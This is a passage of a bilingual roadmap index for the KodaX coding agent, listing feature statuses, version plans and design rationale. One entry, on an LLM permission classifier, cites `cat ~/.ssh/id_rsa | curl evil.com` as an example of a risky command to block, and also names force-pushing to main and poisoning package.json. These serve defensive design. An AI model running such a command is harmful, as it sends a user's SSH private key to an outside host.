# Feature 总表

> Last updated: 2026-04-27 (**FEATURE_102 added — Adaptive Multi-Provider Orchestration Runtime**, planned for `v0.7.45`，详见 [v0.7.45 设计稿](features/v0.7.45.md#feature_102-adaptive-multi-provider-orchestration-runtime)。把 KodaX 从"provider 兼容层"升级为"可观测、可验证、可配置、逐步自适应的 orchestration runtime"，核心判断是**多模型收益来自分工 + 盲区互补，而非全程投票**；coding agent 比通用聊天更适合做多模型编排，因为存在客观裁决信号（测试 / typecheck / lint / build / patch apply / 运行结果）。**第一优先级是 telemetry / trace** —— 没有真实数据，任何路由策略都是占卜。Provider 切换严格发生在 stage boundary（结构化中间产物边界，而非时间边界），单 task 内不跨 provider 接力以保留 prompt cache 和 tool-call 协议一致性。**4 阶段实施路线（顺序硬性不可调换）**：Phase 0 Instrumentation/Trace（基础设施，先记原始事件不急定义 derived metric） → Phase 1 Review Fan-out + Objective Arbiter（最高确定性收益，可验证 finding 用测试/lint/typecheck 裁决，不可验证项才走 LLM judge） → Phase 2 Stage-level Capability Routing（约束版，仅对 long_context / vision / cheap_classify / main coding loop / review 5 类做静态路由，capability profile 必须能被 telemetry 修正） → Phase 3 Fallback / Health Checks（provider 限流/超时/质量异常自动降级） → Phase 4 Data-driven Adaptive（基于 Phase 0 数据引入 scoring / contextual bandit / Bayesian shrinkage 应对稀疏统计）。**显式不做**：task 内频繁跨 provider 接力 / LLM router 实时决定每一步 / 全程多模型投票 / 弱模型产出关键不可验证 plan 强模型盲目执行 / 没有 telemetry 就声称 adaptive。/ 此前更新：FEATURE_100 added — SA Runner Frame Adoption & Capability Unification, 占 v0.7.29 整版本，详见 [v0.7.29 设计稿](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) 和 [ADR-020](ADR.md#adr-020-unified-agent-execution-substrate-feature_100-v0729)。把 SA / AMA 两套独立的 agent 执行路径收敛到统一 Runner 帧 + 单一 executor + 多 Agent declaration 模型（Option α），关闭 v0.7.23 FEATURE_080 "Option Y" facade 之后的双底座漂移。FEATURE_078 (Role-Aware Reasoning Profiles) 在 2026-04-26 一度顺延至 v0.7.30，2026-04-27 撤回顺延、加回 v0.7.29 与 FEATURE_100 同版（FEATURE_100 P3.6v 把 SA / AMA 共享底座做实之后，078 的 4 段决策链 L1→L4 可以原生跑在 substrate executor 上，已实施完成）。下游 089/090/092/094 保持原版本，它们对 Runner 级 guardrail / Agent declaration reasoning slot / `Runner.run(constructedAgent, ...)` 调用链的硬依赖由 FEATURE_100 一并提供。基于 `runner-driven.ts` 当前 13 处 `// legacy parity restore` 注释作为 FEATURE_084 漂移的反向实证；P1-P4 phased delivery + 5 重保险（capability inventory + golden trace + capability contract tests + dispatch eval baseline + reverse audit）+ 3 项加强（已知失踪能力 mining / contract test 锁能力存在 / reverse audit 0 命中）保证零回归直接切换。质量优先于节奏，预计 4-5 周。 / 此前更新：FEATURE_099 Provider Catalog Refresh + FEATURE_098 Per-Model Context Window & Output Token Limits — 两块 provider catalog 卫生工作均已实施完成、登记入 `v0.7.28` 已完成表（unreleased）；099 = DeepSeek V4 系列接入 + kimi-code label 收敛 + 删除 deprecated deepseek-chat/reasoner；098 = 接通 `KodaXModelDescriptor.contextWindow` / `maxOutputTokens` 死字段使 compaction trigger 与 wire-level max_tokens 按激活 model 真实窗口工作 + 当时按 Moonshot 文档把 `kimi.k2.5` 当作 128k 修了一遍 [**事后核对发现 K2.5 实际 256K，已于 commit `64785de` 改正，详见 v0.7.28 设计稿"实施后更正"小节**] + 修复 `zhipu.glm-5-turbo` (128k) 偏差 + 自定义 provider `models[]` 支持描述符对象格式。098 原计划 v0.7.29 与 FEATURE_078 同版发布，因实施提前完成迁入 v0.7.28。新增 `ark-coding` provider（Volcengine Ark Coding Plan，9 model，commit `8b5a380` + `4784dbd` per-model 窗口 pin）。FEATURE_097 AMA Runner Realtime Todo List — Claude Code 风格实时计划列表，planned for `v0.7.34`，作为 Plan B 主路线 `v0.7.33` 结束后第一个 AMA 可见性增强 feature，依赖 FEATURE_084 重写后的 Scout `executionObligations` 契约稳定形态。同时 FEATURE_095 SSH-Friendly Cell-Level Diff Renderer **Absorbed into FEATURE_057** v0.7.30 — cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，单独成版本会让 TUI 重构故事碎片化。SSH/ConPTY 闪烁的最急迫表现已通过 `engine.js` altScreen 分支 `log.clear() + log()` 合并成单次 `log.clearAndRender()` 的 10 行补丁消除，Track F 不再承担"SSH 闪烁唯一解药"的紧迫性——剩余动机（TextInput 光标漂移、渲染字节量、renderer-native selection/hit-test 基础设施）仍成立。)

> 中文阅读说明：
> 这份 `FEATURE_LIST` 是 roadmap 的总索引。
> 除了 feature 名称本身保留英文外，其余内容尽量用中文来说明“现在做到哪了、接下来做什么、该去哪里看设计”。
> `FEATURE_022` 是当前架构转向的总 feature，`019/025/029/034` 是它下面的关键支撑切片。

---

## 当前概况

| Item | Value |
|---|---|
| Tracked feature IDs | `001-103` (026 removed) |
| Total tracked features | `102` |
| Completed | `80` |
| Cancelled | `2` |
| Absorbed | `2` |
| InProgress | `1` |
| Planned | `17` |
| Current released version | `v0.7.27` |

### 各版本待做分布

| Version | Planned features |
|---|---|
| `v0.7.28` | `2` |
| `v0.7.29` | `3` |
| `v0.7.30` | `1` |
| `v0.7.31` | `2` |
| `v0.7.32` | `1` |
| `v0.7.33` | `1` |
| `v0.7.34` | `1` |
| `v0.7.36` | `1` |
| `v0.7.39` | `1` |
| `v0.7.45` | `1` |
| `v0.8.0` | `3` |

---

## 进行中的 Feature

| ID | Title | Planned | Design |
|---|---|---|---|
| `057` | Claude-Aligned TUI Substrate Refactor | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_057-claude-aligned-tui-substrate-refactor) |

---

## 计划中的 Feature

| ID | Title | Category | Priority | Planned | Design |
|---|---|---|---|---|---|
| `087` | ConstructionRuntime and Constructed-World Substrate | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_087-constructionruntime-and-constructed-world-substrate) |
| `088` | Self-Construction Tier 2 — Tool Generation | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_088-self-construction-tier-2--tool-generation) |
| `100` | SA Runner Frame Adoption & Capability Unification | Internal / Refactor | Critical | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) |
| `078` | Role-Aware Reasoning Profiles | Internal | High | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_078-role-aware-reasoning-profiles) |
| `103` | Scout Calibration & L5 User-Followup Escalate | Internal | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate) |
| `060` | Claude-Aligned Bounded-Memory Runtime and OOM Hardening | Internal | High | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_060-claude-aligned-bounded-memory-runtime-and-oom-hardening) |
| `101` | Constructed Agent Admission Contract — Quality Invariants & 5-Step Manifest Vetting | Core / Safety Substrate | Critical | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_101-constructed-agent-admission-contract) |
| `089` | Self-Construction Tier 3 — Agent Generation | Core | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_089-self-construction-tier-3--agent-generation) |
| `090` | Self-Construction Tier 4 — Agent Self-Modifying Role Spec | Core | High | `v0.7.32` | [v0.7.32](features/v0.7.32.md#feature_090-self-construction-tier-4--agent-self-modifying-role-spec) |
| `092` | Auto Mode Classifier — LLM-Reviewed Permission Tier | Core | High | `v0.7.33` | [v0.7.33](features/v0.7.33.md#feature_092-auto-mode-classifier--llm-reviewed-permission-tier-for-high-risk-tool-calls) |
| `097` | AMA Runner Realtime Todo List — Claude-Aligned Visibility Surface | Enhancement | High | `v0.7.34` | [v0.7.34](features/v0.7.34.md#feature_097-ama-runner-realtime-todo-list--claude-aligned-visibility-surface) |
| `094` | Deep Anti-Escape Hardening — Runtime Detection and Retry Contract for Generative Large-File Writes | Core | Medium | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_094-deep-anti-escape-hardening--runtime-detection-and-retry-contract-for-generative-large-file-writes) |
| `095` | ~~SSH-Friendly Cell-Level Diff Renderer for Ink Substrate~~ | ~~Refactor~~ | ~~Medium~~ | ~~`v0.7.39`~~ | [v0.7.30](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095) | **Absorbed into FEATURE_057**: cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，并入 057 作为 Track F 统一设计与交付 |
| `096` | Windows-SSH ConPTY Host Auto-Downgrade to Main-Screen Policy | Enhancement | Medium | `v0.7.39` | [v0.7.39](features/v0.7.39.md#feature_096-windows-ssh-conpty-host-auto-downgrade-to-main-screen-policy) |
| `102` | Adaptive Multi-Provider Orchestration Runtime | Internal / Core | High | `v0.7.45` | [v0.7.45](features/v0.7.45.md#feature_102-adaptive-multi-provider-orchestration-runtime) |
| `093` | Coding and REPL Internal Circular Dependency Decoupling | Internal | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_093-coding-and-repl-internal-circular-dependency-decoupling) |
| `007` | Theme System Consolidation | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_007-theme-system-consolidation) |
| `030` | Multi-Surface Delivery | Enhancement | High | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_030-multi-surface-delivery) |
| `059` | ~~Managed Task Structured Protocol V2~~ | ~~Internal~~ | ~~High~~ | ~~`v0.8.0`~~ | [v0.8.0](features/v0.8.0.md#feature_059-managed-task-structured-protocol-v2) | **Absorbed into FEATURE_084**: 新的 Layer A 原语重写 Scout/Generator/Evaluator 时，会同步把 fenced-block 文本协议替换为 tool-call 驱动的结构化协议。059 的 dual-track visibleText+protocolPayload 目标并入 084 的 Runner/Span 协议层实现，不再作为独立 feature 调度 |
| `063` | ~~Extensible Hook & Automation Substrate~~ | Enhancement | High | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_063-extensible-hook--automation-substrate) | **Cancelled**: Extension 系统已覆盖，executor 能力提取为 `api.exec()`/`api.webhook()` |
| `073` | ~~Reference-Style Lineage and Island Model Removal~~ | ~~Internal~~ | ~~Medium~~ | ~~`v0.7.25`~~ | [v0.7.25](features/v0.7.25.md#feature_073-reference-style-lineage-and-island-model-removal) | **Cancelled**: 哲学审查未通过——没有用户痛点、没有性能改善、主要卖点（`/fork` 改进）已自撤；072 已消除 dual source-of-truth 的结构债；YAGNI（为 partial/multi-boundary compaction 等未规划特性铺抽象）。设计稿保留作为未来真有 use case 时的起点 |

---

## 阅读说明

- `FEATURE_022` 是当前架构转向的 umbrella feature，`FEATURE_019`、`FEATURE_025`、`FEATURE_027`、`FEATURE_028`、`FEATURE_029`、`FEATURE_034` 是它的关键支撑切片。
- `FEATURE_061` 是 AMA 架构简化重构：Scout 成为 AMA 唯一入口（既判断又干活），角色升级保留上下文，每个角色可拉 subagent 并行，去掉预路由层和 Tactical Flow。
- 当前正式执行模型是：`SA` 直达；`AMA` 只保留 `H0 / H1 / H2`；`H3` 已移除。
- `Scout` 是 AMA 的入口和第一执行者：H0 时 Scout 直接完成任务；H1/H2 时 Scout 升级为 Generator 或 Planner 并保留上下文。
- `H1` 是 `Generator + 轻量 Evaluator`：无 `Planner`、无 contract negotiation。Evaluator 打回最多 1 次，再不合格则升级到 H2。
- `H2` 主骨架固定为 `Planner -> Generator <-> Evaluator`。Evaluator 区分 `revise`（执行问题）和 `replan`（计划问题），各最多 1 次。
- `FEATURE_054` 已于 v0.7.27 归档：`/project` 命令整块删除（CLI flag + `project-*.ts` 模块 + barrels + `KODAX_FEATURES_FILE` / `KODAX_PROGRESS_FILE` 常量），无需再做独立的 AMA 吸收任务。后续设计默认以"单主 authority + Planner 吸收 brainstorm"为目标，不再扩独立 project/planner 表面。
- `kodax -c` 属于 `user session` 恢复语义，不属于 internal worker-session recovery。
- `FEATURE_023` 只应继续承担更高层 terminal/delivery ergonomics，不应重新打开 `FEATURE_051 / FEATURE_055` 已冻结的 REPL shell。
- `FEATURE_057` 是 `FEATURE_023` 下的 renderer-boundary 迁移切片：目标是保留当前 shell 的视觉与信息架构，同时把 transcript/prompt/footer 的视口隔离和 host-aware 降级下沉到自有渲染层，而不是重做一个新的 shell。
- `FEATURE_031` 只承担 multimodal artifact intake，不应滑向 gallery、media workbench 或 design-review surface。
- `FEATURE_042` 只应继续加强 repo-intelligence substrate，不应扩成 repo graph / workbench UI。
- `FEATURE_038 / 043 / 053 / 054 / 056` 与 `023 / 031 / 042` 现统一收编到 `v0.7.30`，便于在同一版本内同步推进 runtime clarity、harness safety 与 transcript-native interaction maturity。
- `FEATURE_056` 的目标是补 tool interaction 的解释层与 transcript-native 交互成熟度，不是把 KodaX 做成更重的 coordinator/task cockpit。
- `FEATURE_072` 是 v0.7.18 post-compact 回归（v0.7.19 已用 6 处 surgical fix 止血）之后的结构性收口：把压缩热路径从 flat `context.messages` 迁移到 lineage-native（`getSessionMessagesFromLineage`-driven），让 post-compact attachments 作为 `KodaXSessionCompactionEntry` 的一等字段而不是散在 flat 数组里的 `[Post-compact: ...]` 系统消息。目标是单 source-of-truth，参考 Claude Code `getMessagesAfterCompactBoundary` 和 pi-mono `buildSessionContext`。v0.7.19 的 P4（字符串前缀 dedup）和 P6（REPL finally 复位）在 migration 完成后会被退休。
- `FEATURE_073`（Reference-Style Lineage）已 **Cancelled**。原意是把压缩数据模型从 copy-style 换到 reference-style，对齐 pi-mono / Claude Code 的心智模型。但站在 KodaX "Minimalist & Intelligent" 哲学回看：该 feature 解决零用户痛点（072 已修好 post-compact 回归）、无性能改善（和 copy-style + eviction memory parity）、主要卖点（`/fork` 到压缩前 entry 的语义改进）在挑战过程中被自己撤回；剩余动机"便于未来 partial compaction / multi-boundary 落地"属于 YAGNI。设计稿保留在 `docs/features/v0.7.25.md` 作为未来若出现具体 use case 时的参考起点。
- `FEATURE_076` 是 v0.7.19 Scout ceiling clamp fix（commit `3efdb7b`）之后的结构性收口：把 `runManagedTask` 出口的 `context.messages` 从"代理执行轨迹"（Evaluator 的独立会话、Scout role prompt 包装）收正为"用户对话"（干净的 `{user, assistant}` 对），让 multi-turn conversation、token 统计、session 持久化在 SA/H0/H1/H2/resume 所有路径上语义一致。与 `FEATURE_046`（轮内 worker handoff）关注点不同；`046` 负责轮内 final-answer convergence，`076` 负责轮间 message shape。
- `FEATURE_078` 是 reasoning 子系统的**分层化**：把当前"单一全局 `--reasoning auto|quick|balanced|deep|off` 档位 + 兼容 `--thinking` 别名 + provider `reasoning-overrides`"的平面模型，拆成四级决策链（L1 用户意图上限 / L2 角色默认 / L3 Scout 下游建议 / L4 Evaluator 动态升档）。动机：Scout 自己需要 reasoning 才能跑，因此不能由 Scout 决定所有角色的 reasoning 档位；而一个全局档位又无法区分"Scout 要快、Generator 要深"这类合理诉求。**依赖**：FEATURE_080（Agent primitive 字段）+ FEATURE_084（Scout/Generator/Evaluator 已是 Agent 实例）+ **FEATURE_100（v0.7.29，给 SA 路径的 `defaultCodingAgent` 也接通 Agent declaration 上的 reasoning slot，否则 SA 无角色锚点 → 锁死 L1 ceiling 违背 ADR-003）**。版本节奏：原计划 v0.7.35 → Plan B 移到 v0.7.29 → 2026-04-26 因 FEATURE_100 占满 v0.7.29 移到 v0.7.30 与 FEATURE_057 Track F 共版 → **2026-04-27 撤回顺延、加回 v0.7.29 与 FEATURE_100 同版**（FEATURE_100 P3.6v 完成 SA/AMA 共享底座 17/17 后，substrate executor 已能直接承接 4 段决策链；078 也用 P3.6v 类似的 contract test + grep gate 多重保障落地）。
- **`FEATURE_100`（v0.7.29）是 KodaX 实现层 SA / AMA 双底座漂移的最终收口**。事实状态：`packages/coding/src/agent.ts:1433` `runKodaX`（3164 行）作为 SA 入口，`packages/coding/src/task-engine/runner-driven.ts:3698` `runManagedTaskViaRunner` 作为 AMA 入口，两条路径完全独立；后者 13 处 `// legacy parity restore` 注释（`onSessionStart` / repoIntelligenceContext / `cleanupIncompleteToolCalls` / `saveSessionSnapshot` / cost tracker / multimodal 等）是 v0.7.26 FEATURE_084 让 AMA 路径绕开 `runKodaX` 之后陆续补回的 SA-already-had 能力，构成 FEATURE_084 漂移的反向充分证据。决策模型：用户层 SA / AMA 切换永久保留为产品决策（ADR-003 / ADR-012），实现层收敛到 **Option α — 单一 substrate executor + 多 Agent declaration**（SA topology = `Runner.run(defaultCodingAgent, prompt, ctx)`，AMA topology = `Runner.run(scoutAgent, prompt, ctx)`，dispatcher 只挑 declaration 不分叉 body）。auto-reroute 等 7 类 SA-exclusive 能力按 Class 1 substrate middleware（无条件运行）+ Class 2 Runner-level guardrail（注册式）+ Class 3 declarable opt-in middleware（`AgentDeclaration.middleware` 字段开关，auto-reroute default-on for `defaultCodingAgent` 和 `generatorAgent` —— 让 AMA Generator 也能 mid-iteration 升档应对更难任务，符合 ADR-003）三层归类。**显式废除 v0.7.23 FEATURE_080 的 "Option Y" facade**（Runner.run 注册 dispatcher 转回 `runKodaX` 的 shim），删除 `runDirectKodaX` 符号、删除 13 处 parity-restore patch（能力来自 substrate）。**质量保证**：P1（capability inventory + golden trace + contract test 框架，1 周）→ P2（pure extraction 行为零变更，1-1.5 周）→ P3（Runner Frame Adoption 实质收敛，1.5-2 周）→ P4（dead code cleanup + reverse audit grep `legacy|parity restore|inadvertently dropped` 必须 0 命中，0.5 周），phase 间硬 gate 不得并行。**直接切换不留 legacy flag**（产品决策：质量优先于节奏，避免拖延技术债 + 不重蹈 FEATURE_084 双轨过渡的覆辙）。预计 4-5 周完成。详见 [v0.7.29 设计稿](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) 和 [ADR-020](ADR.md#adr-020-unified-agent-execution-substrate-feature_100-v0729)。
- **`FEATURE_079 - FEATURE_091` + `FEATURE_100` 是 KodaX 从"coding CLI product"升级为"可被复杂 Agent 系统嵌入的基础设施"的主路线**（Plan B 压缩版 + v0.7.29 SA 收敛）。该路线分三段：**SDK 基底段**（v0.7.22-v0.7.27，FEATURE_079 到 086）把 task-engine 拆成可维护的核心 + 引入 Agent/Handoff/Runner/Guardrail/Tracer/Span 等 Layer A 原语 + 按新原语重写 Scout/Generator/Evaluator + 清理 `KodaX*` 前缀死码 + 抽出 repointel 协议包；**底座统一段**（v0.7.29，FEATURE_100）把 SA 路径从独立 `runKodaX` 实现收敛到 Runner 帧 + Agent declaration 模型，关闭 v0.7.23 Option Y facade 之后的实现层双底座漂移，让所有后续 feature 的 Runner-level 集成点在 SA / AMA 两个 mode 下天然对等；**自构建段**（v0.7.28、v0.7.30-v0.7.32，FEATURE_087/088/078/060/089/090）引入 ConstructionRuntime + Constructed-World + 档 2-4 的 Tool/Agent 生成与自改 role spec + reasoning 子系统分层 + bounded-memory 收口。全部完工于 v0.7.32 之前，0.8.0 不做任何底座改动。本方案通过 5 处合并（080+081 / 082+083 / 084+085 / 086+091 / 087+088）+ FEATURE_100 + FEATURE_078 共占 v0.7.29（078 在 100 的 substrate executor 收敛后撤回顺延，2026-04-27）控制版本数。
- `FEATURE_079` 是 task-engine.ts 的**阶段 1 拆分**：纯提取（pure extraction），零行为变化。把当前 9000+ 行的 task-engine 中与 Scout/H1/H2 状态机解耦的部分（prompt builder、pure reducer、managed-task util 等）迁到同目录下的子模块，task-engine.ts 作为 re-export 门面继续提供原有 symbol，测试全部保持绿。这是所有后续 Layer A/B 切分的前提，单独成版本以控制风险。
- `FEATURE_080 + FEATURE_081` 合并在 **v0.7.23** 落地：两者共同完成"**Layer A data shape 定型**"。080 引入 `Agent`（declarative dataclass）、`Handoff`（continuation / as-tool 两种语义）、`Runner`（最小执行入口）、`Guardrail`（占位类型），并 dog-food SA 直达路径。081 把 Compaction 分成 `CompactionPolicy` 接口 + `DefaultSummaryCompaction` + `LineageCompaction`（保留 FEATURE_072 能力），Session 切成基础接口 + `LineageExtension`。合并理由：两者都是"数据形状"层的契约定型，`Agent.tools` / `Agent.handoffs` / `Session` 在内部需要同一批引用点一起定型，分开做反而要 touch 相同文件两次。FEATURE_076 的 round-boundary 语义、FEATURE_060 的 bounded-memory 目标作为设计前置约束保留。
- `FEATURE_082 + FEATURE_083` 合并在 **v0.7.24** 落地：两者共同完成"**primitive 基础设施层**"。082 按 Layer A/B/C 分层切出 `@kodax/core`、`@kodax/mcp`（整体搬迁保留渐进式披露的 lazy connect / 两级描述符 / search-describe / elicitation / cache 五个模式，**暂不泛化** `ProgressiveCapabilitySource` 接口，遵守 CLAUDE.md "3+ real cases 才抽象"规则）、`@kodax/capabilities`、`@kodax/tracing`、`@kodax/session-lineage`。083 引入 `Trace` / `Span` / `SpanData` 子类 / `TracingProcessor` 接口，收编现有碎片化 trace 到同一 span 模型。合并理由：082 已经为 tracing 准备了 `@kodax/tracing` 包位，同版本填充 tracing 内容是自然的连带。同步清掉 `@kodax/ai/cli-events/` 包职责外溢（GLM F-8）。
- `FEATURE_084 + FEATURE_085` 合并在 **v0.7.26** 落地：两者共同完成"**runtime 行为层重写**"。084 用 `Agent` 声明式重写 Scout/Generator/Evaluator 为标准 Agent 实例，用 `Handoff` 表达角色转移，**同步替换** fenced-block 文本协议为 tool-call 驱动的结构化协议（吸收 FEATURE_059 的 dual-track visibleText+protocolPayload 目标）。085 在 Agent 的 input/output/tool 三个挂点补齐 Guardrail runtime，开放注册走 extension runtime。合并理由：084 重写 Scout 时必然 touch Agent 的 input/output/tool 各位点，同时挂 guardrail 钩子比分开两版每版挂一遍经济。
- `FEATURE_086 + FEATURE_091` 合并在 **v0.7.27** 落地：两者共同完成"**清理与协议抽取**"。086 借用户量少的窗口**一次性**移除 `KodaX*` 前缀（不走长期 deprecated 路径），核心 primitive 去前缀，brand 类型（`KodaXError`、`KodaXClient`、`KodaXCodingOptions`）保留；同步清除 `compactMessages()` legacy、`--team` CLI 参数、README 残存 `/project` 流程、GLM F-4/F-5/F-6 归一化函数重复。091 把 `premium-contract.ts` 抽成独立 npm 包 `@kodax/repointel-protocol`，三方消费者（公仓 KodaX、私仓 KodaX-private、`clients/repointel/` 第三方 host 接入）统一依赖协议包，替代当前 vendor 方式。合并理由：两者都是"清洁与抽取"类的结构性 hygiene 工作，风险域互不相交（前缀在 coding/core，协议在 repo-intelligence），可以同版本完成。
- `FEATURE_087 + FEATURE_088` 合并在 **v0.7.28** 落地：两者共同完成"**自构建基础设施 + 档 2 首个消费者**"。087 引入 `ConstructionRuntime` 四段生命周期（stage/test/activate/revoke）+ Constructed-World 存储（`.kodax/constructed/`）+ Resolver 合并 + policy gate。088 让 Agent 生成 Tool 定义并通过 sandbox 测试后注册（档 2）。合并理由：087 提供基础设施，088 是它的首个真实消费者；一起做能验证基础设施的 API shape，避免 087 独立落地后 088 才发现接口需要调整。档 1（Skill 生成）作为既有能力的自然兑现，在本版自动可用。
- `FEATURE_101 + FEATURE_089` 合并在 **v0.7.31** 落地：101 是横切 **Constructed Agent Admission Contract**（quality invariant 三段 hook 模型 + 5 步 manifest 审核 + capability tier + clamp/retry/fallback 多级回退），把 LLM 生成的 manifest 当作 untrusted declaration 在 Runner 入口验证；089 是它的首个消费者（agent generation stage→activate 通道全部走 admission）。合并理由：admission contract 是横切基础设施，089/090/092/094 都消费它，单独成 feature 比埋在 089 里更符合它的地位；同版本同步交付能让 admission 的 schema/eval 指标在 089 真实流量下稳定一轮，再考虑晋升 ADR-021。
- `FEATURE_090`（v0.7.32）**保持独立**：让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。manifest 热替换走 FEATURE_101 同一 admission 通道。单独成版本便于出问题时 rollback。
- `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
- `FEATURE_103` (v0.7.29) 是在 v0.7.29 落 FEATURE_078 期间发现的两个 calibration 问题的合并修正：(1) Scout profile `default: quick → balanced` / `max: balanced → deep`——Scout 自 v0.7.16 FEATURE_061 起已不是单纯分类器，承担 H0/H1/H2 级联决策 + executionObligations + downstream_reasoning_hint 的 meta-reasoning，地板应该和 SA / Generator / Planner / Evaluator 一致是 balanced 而不是分类器时代沿用的 quick；(2) 在 FEATURE_078 的 L1-L4 链上加第 5 层 L5 user-followup escalate——任务边界处用户表达怀疑（"这个不对吧"）或加深要求（"仔细分析"）时单步升档，与 L4（任务内 Evaluator-revise 升档）形成"系统自检 + 用户施压"双轨。doubt 类别要求 prior assistant turn（防 false-positive），deepen 类别不要求；off 是 sacrosanct kill switch；deep 是 fixed point；不直接跳 max（多步可达，避免一次用完头寸）。详见 [v0.7.29 FEATURE_103 设计](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate)。
- **整体时序锁定（Plan B + 092 + 100）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → **v0.7.29 (100 + 078 + 103, SA Runner Frame Adoption + Role-Aware Reasoning Profiles + Scout Calibration & L5 Followup Escalate)** → **v0.7.30 (existing 057+060)** → v0.7.31 (101+089) → v0.7.32 (090) → v0.7.33 (092)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；**100 需 084+085 到位（hard）；078 / 089 / 090 / 092 / 094 都需 100 到位（hard）—— Agent declaration 上的 reasoning slot、Runner 级 guardrail 注册栈、`Runner.run(constructedAgent, ...)` 调用链、manifest hot-swap 的 Runner lifecycle 边界，全部依赖 SA 路径已进入 Runner 帧**；**092 需 085 到位**（不能前移到 0.7.26 之前）。0.8.0 之后不规划。
- `FEATURE_097` 是 v0.7.34 的独立 UX 增强：在 AMA spinner 下方新增 Claude Code 风格的实时计划列表（TodoListSurface 组件），用可视化的 pending / in_progress / completed / failed / skipped 状态展示 Scout 在入口阶段生成的 `executionObligations[]`。**决策点**：**不**按 H0/H1/H2 复杂度硬编码折叠显示；参照 Claude Code 做法，由 Scout 自主决定是否产出 obligations —— 1 条或 0 条时直接不渲染（简单任务自然不干扰），2+ 条统一展开。所有 obligations 完成后 5 秒延迟隐藏。数据流复刻 FEATURE_086 (`onRepoIntelligenceTrace`) 管线：新增 `KodaXEvents.onTodoUpdate` 回调 + 新增 `TodoUpdate` 工具（Generator/Planner 可主动推进状态）+ Evaluator verdict 自动收尾。**依赖**：FEATURE_084 (v0.7.26) 重写完成后的 Scout executionObligations 契约稳定形态；FEATURE_086 (v0.7.27) 前缀清理后的干净命名（避免在工具/类型重命名期间双轨维护）。**不做**：fs 持久化 / 依赖图 / 跨进程 swarm 共享（Claude Code V2 级别的重型基础设施，KodaX 单进程不需要）。
- `FEATURE_095` **Absorbed into FEATURE_057（v0.7.30）Track F**：原计划 v0.7.39 单独成版本的"ink substrate cell-level diff 渲染管线重写"。实地核对 057 现状发现 `packages/repl/src/tui/core/` 已经落了 `screen.ts`（transcript-row 级 `TranscriptScreenBuffer`，非 cell 级）/ `selection.ts` / `hit-test.ts` / `termio.ts`（alt-screen + mouse-tracking）/ `scroll.ts` / `renderer.ts` / `engine.js` 等模块；057 设计稿 §10 renderer-native selection（要求"screen-buffer coordinates + hit-testing against rendered DOM rectangles"）、§11 ScrollBox parity（要求"viewport culling tied to renderer's layout pass"）都依赖 cell-level buffer，而该 buffer 是 095 设计稿的核心产物。两者不是兄弟，而是同一个重构故事的上下层。**合并后的 057 Track F**：在 `packages/repl/src/tui/substrate/ink/` 下引入 `cell-screen.ts`（避免与 `tui/core/screen.ts` 的 `TranscriptScreenBuffer` 撞名）、`frame.ts`、`csi.ts`、`osc.ts`；把 `substrate/ink/log-update.js` 与 `core/internals/log-update.js` 从 `createStandard / createIncremental` 字符串级重写成 `LogUpdate.render(prevFrame, nextFrame)` 类，统一走 cell-level diff + 绝对坐标光标。**SSH 闪烁根因更新**：原设计稿假设根因是 full-redraw 模式本身；实地用 `KODAX_TEE_STDOUT` 诊断后确认**真实根因是 `engine.js` altScreen 分支内 `this.log.clear() + this.log(fullFrameOutput)` 两次独立 stdout.write 拆帧**——中间 1~2ms ConPTY 把"屏幕清空"中间态 flush 给客户端就闪。该点已通过合并为单次 `this.log.clearAndRender(fullFrameOutput)` 的 10 行补丁消除（log-update 内部 eraseLines + content 以单次原子 write 发出），不再需要等 Track F 才能恢复 SSH 可用性。Track F 的剩余动机（TextInput 